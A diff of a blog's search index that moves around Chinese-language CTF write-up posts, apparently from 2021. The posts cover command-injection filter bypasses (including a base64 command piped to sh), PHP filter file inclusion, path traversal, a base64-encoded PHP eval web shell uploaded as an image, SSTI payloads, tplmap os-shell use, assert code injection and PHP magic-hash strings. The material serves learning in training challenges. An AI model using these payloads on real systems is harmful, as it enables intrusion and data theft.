@@ -1,130 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>20210519</title>
-    <url>/posts/948949cb/</url>
-    <content><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><blockquote>
-<p>远程命令执行 绕过</p>
-</blockquote>
-<p>对空格进行了过滤绕过方法：</p>
-<ul>
-<li>${IFS}替换</li>
-<li>$IFS$1替换</li>
-<li>${IFS替换</li>
-<li>%20替换</li>
-<li>&lt;和&lt;&gt;重定向符替换</li>
-<li>%09替换</li>
-</ul>
-<p>cat绕过</p>
-<pre><code>(1)more:一页一页的显示档案内容
-
-(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
-
-(3)head:查看头几行
-
-(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
-
-(5)tail:查看尾几行
-
-(6)nl：显示的时候，顺便输出行号
-
-(7)od:以二进制的方式读取档案内容
-
-(8)vi:一种编辑器，这个也可以查看
-
-(9)vim:一种编辑器，这个也可以查看
-
-(10)sort:可以查看
-
-(11)uniq:可以查看
-
-(12)file -f:报错出具体内容
-</code></pre>
-<p>先执行</p>
-<pre><code>127.0.0.1|ls
-</code></pre>
-<p>看到有flag.php和index.php</p>
-<p>cat发现把空格过滤，这有个绕过，$IFS$1替换，又把flag给过滤了，然后看index的源码，继续绕过。</p>
-<p>1 变量拼接</p>
-<p>payload</p>
-<pre><code>?ip=1;a=g;cat$IFS$1fla$a.php
-</code></pre>
-<p>2 base64编码</p>
-<p>payload</p>
-<pre><code>?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
-</code></pre>
-<p>3 内敛绕过</p>
-<pre><code>?ip=127.0.0.1;cat$IFS$1`ls`
-</code></pre>
-<p>将反引号里面的结果作为命令执行</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210515</title>
-    <url>/posts/9d3f05e0/</url>
-    <content><![CDATA[<h2 id="BUUCTF-极客大挑战-2019-Secret-File"><a href="#BUUCTF-极客大挑战-2019-Secret-File" class="headerlink" title="BUUCTF[极客大挑战 2019]Secret File"></a>BUUCTF[极客大挑战 2019]Secret File</h2><blockquote>
-<p>主要就是文件包含和php伪协议</p>
-</blockquote>
-<p>首先观察网页，一团黑，几个字，F12，发现有个标签跟背景色一样，提示有个Archive_room.php，进去有个按钮一按就跳到了end.php，审查元素有个action.php,用bp抓包</p>
-<pre><code>&lt;html&gt;
-    &lt;!--
-    secr3t.php        
-    --&gt;
-&lt;/html&gt;
-</code></pre>
-<p>提示secr3t.php，进去是php代码，看一圈，经典文件包含</p>
-<p>构造payload:</p>
-<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
-</code></pre>
-<p>base64解码得到flag{66971634-57d7-4de8-a9f2-389057aa5e42}</p>
-<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><blockquote>
-<p>代码审计</p>
-</blockquote>
-<p>F12,提示source.php,打开代码审计</p>
-<p>payload:</p>
-<pre><code>file=hint.php?/../../../../../ffffllllaaaagggg
-</code></pre>
-<p>一顿绕过之后，hint.php?/被当成目录，向上跳目录</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210516</title>
-    <url>/posts/436545a/</url>
-    <content><![CDATA[<h2 id="BUUCTF-ACTF2020-新生赛-Exec"><a href="#BUUCTF-ACTF2020-新生赛-Exec" class="headerlink" title="BUUCTF[ACTF2020 新生赛]Exec"></a>BUUCTF[ACTF2020 新生赛]Exec</h2><blockquote>
-<p>something wrong so I must use English</p>
-</blockquote>
-<p>command execustion and some strange sign</p>
-<p>just need to ping 127.0.0.1 and we can see that it is ok to connect and then we need use the pipe sign to ping like this</p>
-<pre><code>127.0.0.1 | cat /flag
-</code></pre>
-<p>| is a sign that just do the thing behind</p>
-<p>|| if the first iswrong then do the second</p>
-<p>&amp; is do both the two don’need right</p>
-<p>&amp;&amp; is A-&gt;B A must right then B will be done</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20210518</title>
     <url>/posts/e38e795d/</url>
     <content><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><blockquote>
@@ -186,9 +62,67 @@ EXECUTE name;  //执行预定义SQL语句
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210515</title>
+    <url>/posts/9d3f05e0/</url>
+    <content><![CDATA[<h2 id="BUUCTF-极客大挑战-2019-Secret-File"><a href="#BUUCTF-极客大挑战-2019-Secret-File" class="headerlink" title="BUUCTF[极客大挑战 2019]Secret File"></a>BUUCTF[极客大挑战 2019]Secret File</h2><blockquote>
+<p>主要就是文件包含和php伪协议</p>
+</blockquote>
+<p>首先观察网页，一团黑，几个字，F12，发现有个标签跟背景色一样，提示有个Archive_room.php，进去有个按钮一按就跳到了end.php，审查元素有个action.php,用bp抓包</p>
+<pre><code>&lt;html&gt;
+    &lt;!--
+    secr3t.php        
+    --&gt;
+&lt;/html&gt;
+</code></pre>
+<p>提示secr3t.php，进去是php代码，看一圈，经典文件包含</p>
+<p>构造payload:</p>
+<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre>
+<p>base64解码得到flag{66971634-57d7-4de8-a9f2-389057aa5e42}</p>
+<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><blockquote>
+<p>代码审计</p>
+</blockquote>
+<p>F12,提示source.php,打开代码审计</p>
+<p>payload:</p>
+<pre><code>file=hint.php?/../../../../../ffffllllaaaagggg
+</code></pre>
+<p>一顿绕过之后，hint.php?/被当成目录，向上跳目录</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210516</title>
+    <url>/posts/436545a/</url>
+    <content><![CDATA[<h2 id="BUUCTF-ACTF2020-新生赛-Exec"><a href="#BUUCTF-ACTF2020-新生赛-Exec" class="headerlink" title="BUUCTF[ACTF2020 新生赛]Exec"></a>BUUCTF[ACTF2020 新生赛]Exec</h2><blockquote>
+<p>something wrong so I must use English</p>
+</blockquote>
+<p>command execustion and some strange sign</p>
+<p>just need to ping 127.0.0.1 and we can see that it is ok to connect and then we need use the pipe sign to ping like this</p>
+<pre><code>127.0.0.1 | cat /flag
+</code></pre>
+<p>| is a sign that just do the thing behind</p>
+<p>|| if the first iswrong then do the second</p>
+<p>&amp; is do both the two don’need right</p>
+<p>&amp;&amp; is A-&gt;B A must right then B will be done</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -228,20 +162,75 @@ EXECUTE name;  //执行预定义SQL语句
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>sql注入</tag>
         <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
-    <title>20210601</title>
-    <url>/posts/810f4ee1/</url>
-    <content><![CDATA[<h2 id="最近几天在打比赛，断更"><a href="#最近几天在打比赛，断更" class="headerlink" title="最近几天在打比赛，断更"></a>最近几天在打比赛，断更</h2>]]></content>
+    <title>20210519</title>
+    <url>/posts/948949cb/</url>
+    <content><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><blockquote>
+<p>远程命令执行 绕过</p>
+</blockquote>
+<p>对空格进行了过滤绕过方法：</p>
+<ul>
+<li>${IFS}替换</li>
+<li>$IFS$1替换</li>
+<li>${IFS替换</li>
+<li>%20替换</li>
+<li>&lt;和&lt;&gt;重定向符替换</li>
+<li>%09替换</li>
+</ul>
+<p>cat绕过</p>
+<pre><code>(1)more:一页一页的显示档案内容
+
+(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
+
+(3)head:查看头几行
+
+(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
+
+(5)tail:查看尾几行
+
+(6)nl：显示的时候，顺便输出行号
+
+(7)od:以二进制的方式读取档案内容
+
+(8)vi:一种编辑器，这个也可以查看
+
+(9)vim:一种编辑器，这个也可以查看
+
+(10)sort:可以查看
+
+(11)uniq:可以查看
+
+(12)file -f:报错出具体内容
+</code></pre>
+<p>先执行</p>
+<pre><code>127.0.0.1|ls
+</code></pre>
+<p>看到有flag.php和index.php</p>
+<p>cat发现把空格过滤，这有个绕过，$IFS$1替换，又把flag给过滤了，然后看index的源码，继续绕过。</p>
+<p>1 变量拼接</p>
+<p>payload</p>
+<pre><code>?ip=1;a=g;cat$IFS$1fla$a.php
+</code></pre>
+<p>2 base64编码</p>
+<p>payload</p>
+<pre><code>?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
+</code></pre>
+<p>3 内敛绕过</p>
+<pre><code>?ip=127.0.0.1;cat$IFS$1`ls`
+</code></pre>
+<p>将反引号里面的结果作为命令执行</p>
+]]></content>
       <categories>
         <category>ctf每日一题</category>
       </categories>
       <tags>
+        <tag>web</tag>
         <tag>ctf</tag>
       </tags>
   </entry>
@@ -297,8 +286,8 @@ id=0&#39; union select 1,2,3,列名 from 表名#
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>sql注入</tag>
         <tag>代码审计</tag>
       </tags>
@@ -376,10 +365,21 @@ findFile(path)
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>sql注入</tag>
         <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210601</title>
+    <url>/posts/810f4ee1/</url>
+    <content><![CDATA[<h2 id="最近几天在打比赛，断更"><a href="#最近几天在打比赛，断更" class="headerlink" title="最近几天在打比赛，断更"></a>最近几天在打比赛，断更</h2>]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -401,107 +401,9 @@ findFile(path)
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210817</title>
-    <url>/posts/7be9f79f/</url>
-    <content><![CDATA[<blockquote>
-<p>都与flask有关，找机会学一下这个框架</p>
-</blockquote>
-<h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h2><p>F12审查，上传jpg后会以python文件形式将其执行，写一个py然后改后缀即可或者bp抓包改上传形式</p>
-<p>写入以下内容</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;ls /&quot;</span>) <span class="comment">#扫描根目录</span></span><br></pre></td></tr></table></figure>
-
-<p>看回传，有个flag，直接cat就行</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;cat /flag&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h2><p>笑死了</p>
-<p><a href="https://blog.csdn.net/weixin_45950544/article/details/103847262">https://blog.csdn.net/weixin_45950544/article/details/103847262</a></p>
-<p>传入参数</p>
-<pre><code>?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;
-</code></pre>
-<h2 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h2><p>挺有趣的一个题，用tplmap模板注入就行，还挺好用的</p>
-<pre><code>python2 tplmap.py -u url --engine=Jinja --os-shell
-</code></pre>
-<h2 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h2><p>感觉一般般，没给代码</p>
-<p>用的哈希0e的方法</p>
-<p>MD5碰撞</p>
-<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
-<p>攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。</p>
-<p>所以就令a=一个哈希后以”0E“开头的字符串即可</p>
-<p>随便试几个</p>
-<table>
-<thead>
-<tr>
-<th align="center">字符串</th>
-<th align="center">哈希值</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">QNKCDZO</td>
-<td align="center">0e830400451993494058024219903391</td>
-</tr>
-<tr>
-<td align="center">s878926199a</td>
-<td align="center">0e545993274517709034328855841020</td>
-</tr>
-<tr>
-<td align="center">s155964671a</td>
-<td align="center">0e342768416822451524974117254469</td>
-</tr>
-<tr>
-<td align="center">s214587387a</td>
-<td align="center">0e848240448830537924465865611904</td>
-</tr>
-<tr>
-<td align="center">s214587387a</td>
-<td align="center">0e848240448830537924465865611904</td>
-</tr>
-<tr>
-<td align="center">s878926199a</td>
-<td align="center">0e545993274517709034328855841020</td>
-</tr>
-<tr>
-<td align="center">s1091221200a</td>
-<td align="center">0e940624217856561557816327384675</td>
-</tr>
-<tr>
-<td align="center">s1885207154a</td>
-<td align="center">0e509367213418206700842008763514</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210819</title>
-    <url>/posts/9c51da98/</url>
-    <content><![CDATA[<h1 id="XXX二手交易市场"><a href="#XXX二手交易市场" class="headerlink" title="XXX二手交易市场"></a>XXX二手交易市场</h1><p>一个实战题目，网站挺花哨的，没什么提示，最后在头像上传页面有个漏洞，上传一个图片，抓包发现是将图片转成base64传输的，可以将一句话伪装一下，就像这样</p>
-<pre><code>image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
-</code></pre>
-<p>将jpeg换成php,后面的一句话base64encode一下，上传得到返回路径，这时候别乱删，把\给删了，直接蚁剑连接翻目录就行</p>
-<h1 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h1><p>F12看到有个admin.css，打开提示try，那就直接try,发现有源码，代码审计，很简单，传入一个cookie，这有个踩坑</p>
-<pre><code> echo urlencode(serialize($KEY));
-</code></pre>
-<p>先urlencode一下不容易出错</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -590,10 +492,108 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>文件上传</tag>
         <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210817</title>
+    <url>/posts/7be9f79f/</url>
+    <content><![CDATA[<blockquote>
+<p>都与flask有关，找机会学一下这个框架</p>
+</blockquote>
+<h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h2><p>F12审查，上传jpg后会以python文件形式将其执行，写一个py然后改后缀即可或者bp抓包改上传形式</p>
+<p>写入以下内容</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;ls /&quot;</span>) <span class="comment">#扫描根目录</span></span><br></pre></td></tr></table></figure>
+
+<p>看回传，有个flag，直接cat就行</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;cat /flag&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h2><p>笑死了</p>
+<p><a href="https://blog.csdn.net/weixin_45950544/article/details/103847262">https://blog.csdn.net/weixin_45950544/article/details/103847262</a></p>
+<p>传入参数</p>
+<pre><code>?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;
+</code></pre>
+<h2 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h2><p>挺有趣的一个题，用tplmap模板注入就行，还挺好用的</p>
+<pre><code>python2 tplmap.py -u url --engine=Jinja --os-shell
+</code></pre>
+<h2 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h2><p>感觉一般般，没给代码</p>
+<p>用的哈希0e的方法</p>
+<p>MD5碰撞</p>
+<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
+<p>攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。</p>
+<p>所以就令a=一个哈希后以”0E“开头的字符串即可</p>
+<p>随便试几个</p>
+<table>
+<thead>
+<tr>
+<th align="center">字符串</th>
+<th align="center">哈希值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">QNKCDZO</td>
+<td align="center">0e830400451993494058024219903391</td>
+</tr>
+<tr>
+<td align="center">s878926199a</td>
+<td align="center">0e545993274517709034328855841020</td>
+</tr>
+<tr>
+<td align="center">s155964671a</td>
+<td align="center">0e342768416822451524974117254469</td>
+</tr>
+<tr>
+<td align="center">s214587387a</td>
+<td align="center">0e848240448830537924465865611904</td>
+</tr>
+<tr>
+<td align="center">s214587387a</td>
+<td align="center">0e848240448830537924465865611904</td>
+</tr>
+<tr>
+<td align="center">s878926199a</td>
+<td align="center">0e545993274517709034328855841020</td>
+</tr>
+<tr>
+<td align="center">s1091221200a</td>
+<td align="center">0e940624217856561557816327384675</td>
+</tr>
+<tr>
+<td align="center">s1885207154a</td>
+<td align="center">0e509367213418206700842008763514</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210819</title>
+    <url>/posts/9c51da98/</url>
+    <content><![CDATA[<h1 id="XXX二手交易市场"><a href="#XXX二手交易市场" class="headerlink" title="XXX二手交易市场"></a>XXX二手交易市场</h1><p>一个实战题目，网站挺花哨的，没什么提示，最后在头像上传页面有个漏洞，上传一个图片，抓包发现是将图片转成base64传输的，可以将一句话伪装一下，就像这样</p>
+<pre><code>image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
+</code></pre>
+<p>将jpeg换成php,后面的一句话base64encode一下，上传得到返回路径，这时候别乱删，把\给删了，直接蚁剑连接翻目录就行</p>
+<h1 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h1><p>F12看到有个admin.css，打开提示try，那就直接try,发现有源码，代码审计，很简单，传入一个cookie，这有个踩坑</p>
+<pre><code> echo urlencode(serialize($KEY));
+</code></pre>
+<p>先urlencode一下不容易出错</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctf</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -626,9 +626,27 @@ Submit
         <category>ctf学习</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>202108202</title>
+    <url>/posts/3719f1b1/</url>
+    <content><![CDATA[<ol>
+<li>客户端配置了php环境，打算debug，在学习larvel的debug，但是不会弄，还在学</li>
+<li>安装了unbuntu，配置了ssh，用vscode远程连接虚拟机调试</li>
+<li>bugku的web基本做完了，buu上的是真难</li>
+<li>在系统的学习一下web</li>
+<li>搭建了私有云，还行挺流畅</li>
+<li>数学建模停摆了一段时间</li>
+<li>对服务器了解越来越丰富了，单纯宝塔已经无法满足了</li>
+<li>实习报告还没开始写</li>
+</ol>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
   </entry>
   <entry>
     <title>202108203</title>
@@ -665,6 +683,43 @@ Submit
       </tags>
   </entry>
   <entry>
+    <title>20210827</title>
+    <url>/posts/50c4a45c/</url>
+    <content><![CDATA[<h1 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一次写与ctf有关的python脚本(抄的)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:19128/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">ret=s.get(url)</span><br><span class="line"></span><br><span class="line">equation = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,ret.text).group()</span><br><span class="line"></span><br><span class="line">ans=<span class="built_in">eval</span>(equation)</span><br><span class="line"></span><br><span class="line">d=&#123;<span class="string">&quot;value&quot;</span>:ans&#125;</span><br><span class="line"></span><br><span class="line">flag=s.post(url,data=d)</span><br><span class="line"></span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctf</tag>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210901</title>
+    <url>/posts/8a5309dc/</url>
+    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
+<p>git泄露，代码审计，assert命令执行</p>
+</blockquote>
+<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
+</code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
+</code></pre>
+<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctf</tag>
+        <tag>rce</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>20210830</title>
     <url>/posts/d7bb00be/</url>
     <content><![CDATA[<h1 id="HMBCTF-2021-EzLight"><a href="#HMBCTF-2021-EzLight" class="headerlink" title="[HMBCTF 2021]EzLight"></a>[HMBCTF 2021]EzLight</h1><p>先下载源码，本地搭建一下环境，我这出了点问题了，一直显示服务器内部错误。</p>
@@ -698,64 +753,9 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>202108202</title>
-    <url>/posts/3719f1b1/</url>
-    <content><![CDATA[<ol>
-<li>客户端配置了php环境，打算debug，在学习larvel的debug，但是不会弄，还在学</li>
-<li>安装了unbuntu，配置了ssh，用vscode远程连接虚拟机调试</li>
-<li>bugku的web基本做完了，buu上的是真难</li>
-<li>在系统的学习一下web</li>
-<li>搭建了私有云，还行挺流畅</li>
-<li>数学建模停摆了一段时间</li>
-<li>对服务器了解越来越丰富了，单纯宝塔已经无法满足了</li>
-<li>实习报告还没开始写</li>
-</ol>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>20210827</title>
-    <url>/posts/50c4a45c/</url>
-    <content><![CDATA[<h1 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一次写与ctf有关的python脚本(抄的)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:19128/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">ret=s.get(url)</span><br><span class="line"></span><br><span class="line">equation = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,ret.text).group()</span><br><span class="line"></span><br><span class="line">ans=<span class="built_in">eval</span>(equation)</span><br><span class="line"></span><br><span class="line">d=&#123;<span class="string">&quot;value&quot;</span>:ans&#125;</span><br><span class="line"></span><br><span class="line">flag=s.post(url,data=d)</span><br><span class="line"></span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210901</title>
-    <url>/posts/8a5309dc/</url>
-    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
-<p>git泄露，代码审计，assert命令执行</p>
-</blockquote>
-<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
-</code></pre>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span 